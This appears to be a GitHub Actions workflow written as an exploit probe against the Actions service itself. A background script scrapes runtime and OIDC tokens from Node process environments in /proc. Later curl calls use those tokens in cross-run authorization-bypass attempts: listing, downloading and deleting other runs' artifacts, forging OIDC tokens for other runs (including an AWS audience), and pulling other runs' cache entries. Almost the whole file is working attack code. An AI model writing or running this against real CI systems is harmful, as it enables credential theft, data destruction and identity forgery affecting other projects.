name: ZeroDayProbe9
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Start proc-race directly on host (no Docker needed)
        run: |
          cat > /tmp/grab.sh << 'GRABEOF'
          #!/bin/bash
          echo "=GRAB_START="
          echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          for i in $(seq 1 300); do
            for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$"); do
              cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " " | head -c 200)
              if echo "$cmd" | grep -qiE "^node |node /"; then
                envdata=$(cat /proc/$pid/environ 2>/dev/null | base64 -w0 || true)
                if [ -n "$envdata" ] && echo "$envdata" | base64 -d 2>/dev/null | grep -q ACTIONS_RUNTIME_TOKEN; then
                  echo "GOT_PID=$pid ITER=$i"
                  RT=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RUNTIME_TOKEN=" | cut -d= -f2-)
                  OIDC_REQ=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_ID_TOKEN_REQUEST_TOKEN=" | cut -d= -f2-)
                  OIDC_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_ID_TOKEN_REQUEST_URL=" | cut -d= -f2-)
                  RESULTS_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RESULTS_URL=" | cut -d= -f2-)
                  RUNTIME_URL=$(echo "$envdata" | base64 -d | tr "\0" "\n" | grep "^ACTIONS_RUNTIME_URL=" | cut -d= -f2-)
                  printf '%s' "$RT" > /tmp/ZD_RT.txt
                  printf '%s' "$OIDC_REQ" > /tmp/ZD_OIDC_REQ.txt
                  printf '%s' "$OIDC_URL" > /tmp/ZD_OIDC_URL.txt
                  printf '%s' "$RESULTS_URL" > /tmp/ZD_RESULTS_URL.txt
                  printf '%s' "$RUNTIME_URL" > /tmp/ZD_RUNTIME_URL.txt
                  echo "DONE" > /tmp/ZD_STATUS.txt
                  echo "RT_LEN=${#RT}"
                  echo "OIDC_URL=$OIDC_URL"
                  echo "RESULTS_URL=$RESULTS_URL"
                  break 2
                fi
              fi
            done
            sleep 0.1
          done
          echo "=GRAB_DONE="
          GRABEOF
          chmod +x /tmp/grab.sh
          echo "probe9" > /tmp/probe.txt
          rm -f /tmp/ZD_STATUS.txt /tmp/ZD_RT.txt
          nohup bash /tmp/grab.sh > /tmp/grab.log 2>&1 &
          echo $! > /tmp/bgpid.txt
          sleep 1

      - name: Spawn token (upload-artifact triggers Node.js with ACTIONS_RUNTIME_TOKEN)
        uses: actions/upload-artifact@v4
        with:
          name: probe-art
          path: /tmp/probe.txt

      - name: Wait for token then run ALL vectors (host curl)
        run: |
          echo "=GRAB_LOG="
          for i in $(seq 1 30); do
            if [ -f /tmp/ZD_STATUS.txt ] && grep -q DONE /tmp/ZD_STATUS.txt; then
              echo "TOKEN_GRABBED at iter=$i"
              break
            fi
            sleep 1
          done
          kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
          cat /tmp/grab.log
          echo "=GRAB_LOG_END="

          RT=$(cat /tmp/ZD_RT.txt 2>/dev/null)
          OIDC_REQ=$(cat /tmp/ZD_OIDC_REQ.txt 2>/dev/null)
          OIDC_URL=$(cat /tmp/ZD_OIDC_URL.txt 2>/dev/null)
          RESULTS_URL=$(cat /tmp/ZD_RESULTS_URL.txt 2>/dev/null)
          RUNTIME_URL=$(cat /tmp/ZD_RUNTIME_URL.txt 2>/dev/null)

          echo "RT_LEN=${#RT}"
          echo "RESULTS_URL=$RESULTS_URL"
          echo "OIDC_URL=$OIDC_URL"

          if [ -z "$RT" ]; then
            echo "NO_TOKEN_CAPTURED - exiting"
            exit 1
          fi

          P32="62b2fd0f-6d09-4648-9063-f2281ca31c50"
          J32="ab2ec91c-0a74-5a3f-a68c-b0d93647321a"
          P36="b7053f37-c231-4cee-8fe9-33514d44b40b"
          J36="efc9c5e3-54ec-55a7-a0fa-716737c5aba4"

          echo "=V1_GENERICREAD_BOLA="
          echo "V1a ListArtifacts Run32 (cross-run BOLA test):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$P32\",\"workflowJobRunBackendId\":\"$J32\"}"
          echo ""
          echo "V1b ListArtifacts Run36 (cross-run BOLA test):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$P36\",\"workflowJobRunBackendId\":\"$J36\"}"
          echo ""
          echo "V1c GetSignedArtifactURL Run32 (cross-run download):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$P32\",\"workflowJobRunBackendId\":\"$J32\",\"name\":\"probe-art\"}"
          echo ""
          echo "V1d DeleteArtifact Run36 (cross-run, no scp check):"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$P36\",\"workflowJobRunBackendId\":\"$J36\",\"name\":\"probe-art\"}"
          echo ""
          echo "=V1_END="

          echo "=V2_OIDC="
          if [ -n "$OIDC_URL" ] && [ -n "$OIDC_REQ" ]; then
            echo "V2a GH audience (normal OIDC):"
            curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${OIDC_URL}&audience=api.github.com"
            echo ""
            echo "V2b AWS audience:"
            curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${OIDC_URL}&audience=sts.amazonaws.com"
            echo ""

            OWN_PLAN=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
            OWN_JOB=$(echo "$OIDC_URL" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
            echo "OWN_PLAN=$OWN_PLAN OWN_JOB=$OWN_JOB"
            BASE32="${OIDC_URL/$OWN_PLAN\//$P32\/}"
            SUBST32="${BASE32/$OWN_JOB/$J32}"
            BASE36="${OIDC_URL/$OWN_PLAN\//$P36\/}"
            SUBST36="${BASE36/$OWN_JOB/$J36}"
            NIL_URL="${OIDC_URL/$OWN_PLAN/00000000-0000-0000-0000-000000000000}"
            NIL_URL="${NIL_URL/$OWN_JOB/00000000-0000-0000-0000-000000000000}"

            echo "V2d OIDC URL substitution Run32 (forge OIDC identity of other run):"
            echo "SUBST32=$SUBST32"
            curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${SUBST32}&audience=api.github.com"
            echo ""
            echo "V2e OIDC URL substitution Run36:"
            echo "SUBST36=$SUBST36"
            curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${SUBST36}&audience=api.github.com"
            echo ""
            echo "V2f OIDC NIL IDs (000...000 wildcard attempt):"
            echo "NIL_URL=$NIL_URL"
            curl -s -w "\nHTTP=%{http_code}" -H "Authorization: Bearer $OIDC_REQ" "${NIL_URL}&audience=api.github.com"
            echo ""
          fi
          echo "=V2_END="

          echo "=V3_PIPELINES="
          for ep in "_apis/pipelines/jobs" "_apis/build/builds" "_apis/distributedtask/hubs/build/plans" "_apis/pipelines"; do
            echo "V3 $ep:"
            curl -s -w "\nHTTP=%{http_code}" "${RUNTIME_URL}${ep}?api-version=2.0" \
              -H "Authorization: Bearer $RT" | head -c 500
            echo ""
          done
          echo "=V3_END="

          echo "=V4_CACHE="
          echo "V4 CacheService BOLA Run32:"
          curl -s -w "\nHTTP=%{http_code}" -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
            -d "{\"workflowRunBackendId\":\"$P32\",\"workflowJobRunBackendId\":\"$J32\",\"key\":\"node-modules\",\"restoreKeys\":[\"node\"],\"version\":\"1\"}"
          echo ""
          echo "=V4_END="
